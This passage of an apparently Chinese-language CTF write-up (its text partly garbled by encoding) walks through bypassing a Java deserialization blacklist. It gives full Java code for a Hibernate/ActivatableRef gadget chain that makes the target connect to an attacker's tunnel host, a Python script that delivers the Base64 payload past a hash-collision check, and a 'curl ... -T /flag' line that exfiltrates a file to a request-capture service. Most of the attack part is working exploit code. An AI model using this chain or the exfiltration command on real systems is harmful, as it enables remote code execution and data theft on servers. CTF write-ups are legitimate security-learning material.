SecurityObjectInputStream(InputStream inputStream) throws IOException &#123;</span><br><span class="line">        super(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override // java.io.ObjectInputStream</span><br><span class="line">    protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        if (!contains(cls.getName())) &#123;</span><br><span class="line">            return super.resolveClass(cls);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;Unexpected serialized class&quot; + cls.getName());</span><br><span class="line">        throw new InvalidClassException(&quot;Unexpected serialized class&quot;, cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static boolean contains(String targetValue) &#123;</span><br><span class="line">        for (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">            if (targetValue.contains(forbiddenPackage)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç è®¾ç½®äº†ä¸€ä¸ªé»‘åå•ï¼Œç¦ç”¨{â€œorg.apache.commons.collectionsâ€, â€œjavax.swingâ€, â€œcom.sun.rowsetâ€, â€œcom.sun.org.apache.xalanâ€, â€œjava.securityâ€, â€œjava.rmi.MarshalledObjectâ€, â€œjavax.management.remote.rmi.RMIConnectorâ€}è¿™äº›ä¸œè¥¿ã€‚å…¶å®æˆ‘ä¹Ÿçœ‹ä¸æ‡‚è¿™äº›ä¸œè¥¿æ˜¯ä»€ä¹ˆã€‚</p>
<p>åšä¸ªè°ƒæŸ¥ã€‚</p>
<p><img src="/images/QQ20251209-173559.png" alt="alt text"></p>
<p>ç”¨ä¸€ä¸‹ç¥ç§˜å°å·¥å…·ã€‚</p>
<p>è¿™äº›éƒ½æ˜¯å¸¸è§çš„javaååºåˆ—é“¾æ‰€ç”¨åˆ°çš„åº“ã€‚</p>
<p>è¿™ä¸ªå®‰å…¨æ£€æµ‹å°±æ˜¯çœ‹æˆ‘ä»¬é“¾ä¸­æ˜¯å¦æœ‰è¿™äº›åº“ä¸­çš„ä¸œè¥¿ï¼Œå¦‚æœæœ‰é‚£æˆ‘ä»¬çš„ååºåˆ—é“¾å°±è¢«å¹²æ‰äº†ã€‚</p>
<p>ä»¥ä¸Šå°±æ˜¯æˆ‘ä»¬ä»æºç ä¸­è·å¾—çš„ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦å¼€å§‹æ„é€ æ”»å‡»é“¾ã€‚</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://cina666.github.io/2025/03/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/">https://cina666.github.io/2025/03/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/</a></p>
</blockquote>
<p>å¼•ç”¨ä¸€ç¯‡æ–‡ç« ã€‚</p>
<p>æˆ‘ä»¬æ„é€ çš„payloadæ˜¯ä¸€ä¸ªå¥—å¨ƒå‹çš„ç»“æ„ã€‚</p>
<p><strong>ç¬¬ä¸€éƒ¨åˆ†:</strong></p>
<p>Java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[cite_start]// [cite: 91-95]</span><br><span class="line">String host = &quot;æœåŠ¡å™¨ip&quot;; </span><br><span class="line">int port = ç«¯å£;                      </span><br><span class="line">TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">UnicastRef ref = new UnicastRef(new LiveRef(id2, te, false));</span><br><span class="line">...</span><br><span class="line">ActivatableRef activatableRef = ...</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>TCPEndpoint</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªåº•å±‚çš„ Java RMI ç±»ï¼Œå®ƒåœ¨è‚šå­é‡Œå­˜äº†ä¸¤ä¸ªå…³é”®æ•°æ®ï¼šIP å’Œç«¯å£ã€‚åºåˆ—åŒ–æ—¶ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²è¢«å†™è¿›äº†äºŒè¿›åˆ¶æµã€‚(å› ä¸ºæˆ‘ä»¬åšçš„è¿™å¥—æ“ä½œæ˜¯è®©æœåŠ¡èµ·è¿œç¨‹æ“ä½œï¼Œæ‰€ä»¥è¿ç”¨åˆ°äº†RMI)</li>
<li><strong>ActivatableRef</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚å®ƒçš„ç‰¹æ€§æ˜¯ï¼šå½“æœ‰äººè°ƒç”¨å®ƒçš„ <code>getRef()</code> æ–¹æ³•æ—¶ï¼Œå®ƒä¼šå°è¯•å»ºç«‹ TCP è¿æ¥ã€‚</li>
</ul>
<p><strong>ç¬¬äºŒéƒ¨åˆ†:</strong></p>
<p>Java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[cite_start]// [cite: 104, 112-116]</span><br><span class="line">TypedValue typedValue = new TypedValue(componentType, activatableRef);</span><br><span class="line">new GetterMethodImpl(Object.class, &quot;qwq&quot;, c1.getDeclaredMethod(&quot;getRef&quot;))</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>TypedValue</strong>ï¼šè¿™æ˜¯ Hibernate åº“é‡Œçš„ä¸€ä¸ªç±»ã€‚å®ƒçš„è®¾è®¡åˆè¡·æ˜¯å°è£…ä¸€ä¸ªå€¼ã€‚å®ƒçš„hashCode()é€»è¾‘ï¼šTypedValueåœ¨è®¡ç®—å“ˆå¸Œæ—¶ï¼Œä¸ä¼šç›´æ¥ç®—ï¼Œè€Œæ˜¯å»è°ƒç”¨å†…éƒ¨æŒæœ‰å¯¹è±¡çš„Getter ã€‚</p>
<p><img src="/images/QQ20251209-181754.png" alt="alt text"></p>
</li>
<li><p><strong>Reflection</strong>ï¼šåå°„ä¿®æ”¹<code>typevalue</code>ä¸­çš„Getterï¼Œä¿®æ”¹ä¸º<code>ActivatableRef</code>çš„getRef().</p>
</li>
</ul>
<p><strong>ç¬¬ä¸‰éƒ¨åˆ†:</strong></p>
<p>Java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[cite_start]// [cite: 87, 118, 122, 129]</span><br><span class="line">Hashtable hashtable = new Hashtable();</span><br><span class="line">hashtable.put(1, 111);</span><br><span class="line">Object[] table = (Object[]) tableField.get(hashtable);</span><br><span class="line">setField(entry, &quot;key&quot;, typedValue);</span><br></pre></td></tr></table></figure>

<ul>
<li>å…ˆæ”¾ä¸€ä¸ªæ— å®³çš„æ•°å­— 1ã€‚(é¿å…ç”Ÿæˆpayloadçš„æ—¶å€™ç›´æ¥è¿æ¥æˆ‘ä»¬çš„ç”µè„‘ã€‚)</li>
<li><strong>setField</strong>ï¼šå¾…<code>hashtable</code>è¿è¡Œå,åœ¨æ›¿æ¢æ‰1.</li>
<li><strong>hashtable</strong>ï¼šæŸ¥è¯¢æ•°æ®ï¼Œå†³å®šæ•°æ®çš„å­˜æ”¾ä½ç½®ã€‚</li>
</ul>
<p><strong>ç¬¬å››éƒ¨åˆ†ï¼š</strong></p>
<p>Java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[cite_start]// [cite: 131, 157]</span><br><span class="line">String string = Base64.getEncoder().encodeToString(ser(hashtable));</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>ser</strong>ï¼š<code>ser()</code> æ–¹æ³•å†…éƒ¨è°ƒç”¨äº† <code>objectOutputStream.writeObject(o)</code>ã€‚</li>
</ul>
<hr>
<p><strong>è¿‡ç¨‹ï¼š</strong></p>
<ol>
<li>**åºåˆ—åŒ– **ï¼šéå†è¿™ä¸ª<code>Hashtable</code>ã€‚<ul>
<li>æŠŠ <code>Hashtable</code> çš„ç»“æ„å†™æˆäºŒè¿›åˆ¶ã€‚</li>
<li>æœ‰ä¸ª Key æ˜¯ <code>TypedValue</code>ï¼ŒæŠŠå®ƒä¹Ÿå†™æˆäºŒè¿›åˆ¶ã€‚</li>
<li><code>TypedValue</code> é‡ŒåŒ…å« <code>ActivatableRef</code>ï¼ŒæŠŠå®ƒä¹Ÿå†™è¿›å»ã€‚</li>
<li><code>ActivatableRef</code> é‡ŒåŒ…å« <code>6.tcp.vip.cpolar.cn</code>ï¼ŒæŠŠè¿™ä¸²å­—ç¬¦ä¹Ÿå†™è¿›å»ã€‚</li>
</ul>
</li>
<li><strong>Base64 ç¼–ç </strong>ï¼šBase64 æŠŠå®ƒå˜æˆäº†ä¸€ä¸²ç”± <code>a-z, A-Z, 0-9</code> ç»„æˆçš„å­—ç¬¦ä¸²ã€‚</li>
</ol>
<p>æ‰€ä»¥ï¼Œæœ€ç»ˆç”Ÿæˆpayloadçš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.rmi.server.ObjID;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import java.util.Random;</span><br><span class="line">import sun.rmi.server.ActivatableRef;</span><br><span class="line">import sun.rmi.server.UnicastRef;</span><br><span class="line">import sun.rmi.transport.LiveRef;</span><br><span class="line">import sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line">import sun.reflect.ReflectionFactory;</span><br><span class="line">import org.hibernate.engine.spi.TypedValue;</span><br><span class="line">import org.hibernate.property.access.spi.Getter;</span><br><span class="line">import org.hibernate.property.access.spi.GetterMethodImpl;</span><br><span class="line">import org.hibernate.tuple.component.AbstractComponentTuplizer;</span><br><span class="line">import org.hibernate.tuple.component.PojoComponentTuplizer;</span><br><span class="line">import org.hibernate.type.ComponentType;</span><br><span class="line"></span><br><span class="line">public class hibernate &#123;</span><br><span class="line"></span><br><span class="line">    // 1. è®¾ç½®æœåŠ¡å™¨ï¼Œè¦æ˜¯èƒ½è·Ÿipç›¸è¿çš„ã€‚</span><br><span class="line">    public static String host = &quot;6.tcp.vip.cpolar.cn&quot;; </span><br><span class="line">    public static int port = 12176;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        hashtable.put(1, 111); </span><br><span class="line"></span><br><span class="line">        // è¿æ¥æˆ‘ä»¬çš„æœåŠ¡å™¨ã€‚</span><br><span class="line">        ObjID id = new ObjID(new Random().nextInt());</span><br><span class="line">        TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">        </span><br><span class="line">        ActivatableRef activatableRef = (ActivatableRef) createWithoutConstructor(Class.forName(&quot;sun.rmi.server.ActivatableRef&quot;));</span><br><span class="line">        setField(activatableRef, &quot;id&quot;, new java.rmi.activation.ActivationID(null));</span><br><span class="line">        setField(activatableRef, &quot;ref&quot;, ref);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass = ComponentType.class;</span><br><span class="line">        ComponentType componentType = (ComponentType) createWithoutConstructor(componentTypeClass);</span><br><span class="line">        </span><br><span class="line">        GetterMethodImpl getter = new GetterMethodImpl(ActivatableRef.class, &quot;qwq&quot;, ActivatableRef.class.getDeclaredMethod(&quot;getRef&quot;));</span><br><span class="line">        </span><br><span class="line">        PojoComponentTuplizer tuplizer = (PojoComponentTuplizer) createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        setField(tuplizer, &quot;getters&quot;, new Getter[]&#123;getter&#125;);</span><br><span class="line">        </span><br><span class="line">        setField(componentType, &quot;componentTuplizer&quot;, tuplizer);</span><br><span class="line">        setField(componentType, &quot;propertySpan&quot;, 1);</span><br><span class="line"></span><br><span class="line">        TypedValue typedValue = new TypedValue(componentType, null);</span><br><span class="line">        setField(typedValue, &quot;value&quot;, activatableRef);</span><br><span class="line"></span><br><span class="line">        Field tableField = Hashtable.class.getDeclaredField(&quot;table&quot;);</span><br><span class="line">        tableField.setAccessible(true);</span><br><span class="line">        Object[] table = (Object[]) tableField.get(hashtable);</span><br><span class="line">        </span><br><span class="line">        for (Object entry : table) &#123;</span><br><span class="line">            if (entry == null) continue;</span><br><span class="line">            Field keyField = entry.getClass().getDeclaredField(&quot;key&quot;);</span><br><span class="line">            keyField.setAccessible(true);</span><br><span class="line">            keyField.set(entry, typedValue);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // ç»“æŸæ”»å‡»</span><br><span class="line"></span><br><span class="line">        String base64String = Base64.getEncoder().encodeToString(serialize(hashtable));</span><br><span class="line">        System.out.println(&quot;\n===== å¤åˆ¶ä¸‹é¢çš„ Base64 Payload =====&quot;);</span><br><span class="line">        System.out.println(base64String);</span><br><span class="line">        System.out.println(&quot;=====================================\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // è¾…åŠ©å·¥å…·æ–¹æ³•</span><br><span class="line"></span><br><span class="line">    public static Object createWithoutConstructor(Class clazz) throws Exception &#123;</span><br><span class="line">        ReflectionFactory rf = ReflectionFactory.getReflectionFactory();</span><br><span class="line">        Constructor objDef = Object.class.getDeclaredConstructor();</span><br><span class="line">        Constructor intConstr = rf.newConstructorForSerialization(clazz, objDef);</span><br><span class="line">        return clazz.cast(intConstr.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setField(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Field getField(Class&lt;?&gt; clazz, String fieldName) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return clazz.getDeclaredField(fieldName);</span><br><span class="line">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">            if (clazz.getSuperclass() != null)</span><br><span class="line">                return getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè¿™æ®µjavaä»£ç åï¼Œä¼šç”Ÿæˆä¸€å¤§æ®µbase64ç¼–ç åçš„å­—ç¬¦ï¼Œæ­£æ˜¯ååºåˆ—åŒ–å†…å®¹ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œå°±è¦å‡†å¤‡ä¸œè¥¿äº†ï¼Œæˆ‘ä»¬ä¸Šè¿°çš„base64å­—èŠ‚æµååºåˆ—åŒ–åï¼Œèµ·åˆ°çš„ä½œç”¨ä»…ä»…åªæ˜¯è®©é¢˜ç›®çš„é¶æœºtcpè¿ä¸Šæˆ‘ä»¬è®¾å®šå¥½çš„æœåŠ¡å™¨ï¼Œè¿˜æ˜¯æ‹¿ä¸åˆ°flagï¼Œæˆ‘ä»¬éœ€è¦è®©é¢˜ç›®çš„é¶æœºæ‰§è¡Œè·å–flagçš„æŒ‡ä»¤ã€‚</p>
<p>è¿™è¾¹ç”¨åˆ°äº†java chainï¼Œå¯ä»¥å»githubä¸‹è½½ï¼Œç„¶åç›´æ¥éƒ¨ç½²åœ¨è‡ªå·±çš„æœ¬åœ°ä¸Šã€‚</p>
<p><img src="/images/QQ20251209-185038.png" alt="alt text"></p>
<p>ç¬¬ä¸€æ­¥ï¼Œå‘é€æˆ‘ä»¬çš„base64å­—èŠ‚æµã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 1. é¶æœºåœ°å€ (é¢˜ç›®é‡å¯åç«¯å£å¯èƒ½ä¼šå˜ï¼Œè¯·æ£€æŸ¥)</span><br><span class="line">[cite_start]# [cite: 201]</span><br><span class="line">url = &quot;http://challenge.bluesharkinfo.com:23923/api/echo&quot;</span><br><span class="line"></span><br><span class="line"># 2. é€šè¡Œè¯ (åˆ©ç”¨å“ˆå¸Œç¢°æ’ç»•è¿‡æ£€æŸ¥ï¼Œå›ºå®šå€¼)</span><br><span class="line">[cite_start]# [cite: 203]</span><br><span class="line">pass_val = &quot;n1giU&quot;</span><br><span class="line"></span><br><span class="line"># 3. ç‚¸å¼¹è¯±é¥µ (åœ¨è¿™é‡Œç²˜è´´ä½  Java ç”Ÿæˆçš„é‚£ä¸€å¤§ä¸² Base64)</span><br><span class="line">[cite_start]# [cite: 206-232]</span><br><span class="line">payload = &quot;ase64å­—ç¬¦ä¸²&quot;</span><br><span class="line"></span><br><span class="line"># 4. åŒ…è£…ä¿¡å° (è®¾ç½®è¯·æ±‚å¤´)</span><br><span class="line">[cite_start]# [cite: 234-240]</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Pass&quot;: pass_val, </span><br><span class="line">    &quot;echo&quot;: payload    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">no_proxy = &#123; &quot;http&quot;: None, &quot;https&quot;: None &#125;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    print(f&quot;[-] æ­£åœ¨å‘ &#123;url&#125; ä¼ è¾“...&quot;)</span><br><span class="line">    </span><br><span class="line">    # 6. å‘å°„è¯·æ±‚ </span><br><span class="line">    [cite_start]# [cite: 246-250]</span><br><span class="line">    response = requests.get(</span><br><span class="line">        url=url, </span><br><span class="line">        headers=headers, </span><br><span class="line">        proxies=no_proxy, </span><br><span class="line">        timeout=5         </span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    print(f&quot;[+] è¯·æ±‚å‘é€å®Œæ¯•ï¼ŒçŠ¶æ€ç : &#123;response.status_code&#125;&quot;)</span><br><span class="line">    print(&quot;[*] æˆåŠŸï¼&quot;)</span><br><span class="line"></span><br><span class="line">except Exception as e:</span><br><span class="line"></span><br><span class="line">    print(f&quot;[!] å‘é€æŠ¥é”™ : &#123;e&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ—¶å€™ï¼Œé¢˜ç›®çš„é¶æœºå°±ä¼šæ‰§è¡Œæ“ä½œï¼Œtcpè¿æ¥æˆ‘ä»¬è®¾å®šçš„æœåŠ¡å™¨ã€‚</p>
<p>æˆ‘è¿™è¾¹ç”¨çš„æ˜¯Cpolarï¼Œåœ¨æœ¬åœ°è¿è¡Œåï¼Œæ‰“é€šå…¬ç½‘ä¸å†…ç½‘çš„é€šé“ï¼Œåˆ›å»ºä¸€ä¸ªå£å­ã€‚</p>
<p>åˆ©ç”¨è¿™ä¸ªå£å­ï¼ŒæœåŠ¡å™¨é¶æœºå°±ä¼šè¿æ¥è¿›æ¥ï¼Œç„¶åè®¿é—®æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œæ‰§è¡Œæˆ‘ä»¬java chainä¸Šçš„æŒ‡ä»¤ã€‚</p>
<p>ä½†æ˜¯å•å•è¿™æ ·è¿˜æ²¡æœ‰ç”¨ï¼Œæ‰§è¡Œäº†è·å–flagçš„æŒ‡ä»¤ï¼Œé‚£æˆ‘æ€ä¹ˆæ‹¿åˆ°å‘¢ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä¸€ä¸ªä¸´æ—¶æœåŠ¡å™¨æ¥æ¥å—é¶æœºè·å–çš„flagã€‚</p>
<p><code>curl ä¸´æ—¶æœåŠ¡å™¨ -T /flag</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://requestrepo.com/">https://requestrepo.com/</a></p>
</blockquote>
<p>è¿™è¾¹ç”¨çš„æ˜¯è¿™ä¸ªã€‚</p>
<p>æœ€åç”¨pythonå‘é€å®Œè¯·æ±‚åï¼Œå»ä¸´æ—¶æœåŠ¡å™¨ä¸Šçœ‹å°±æ”¶è·äº†flagã€‚</p>
<p><img src="/images/6C7F80F50AC376128618E4DEB1707C5A.png" alt="alt text"></p>
<hr>
<p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ç”±ç™½ç™½æ¯›æ¯›åˆ›ä½œï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>

        </div>
    </article>
</div>

</div>

<script src="/js/main.js?v=1767337365559"></script>
</body>
</html>
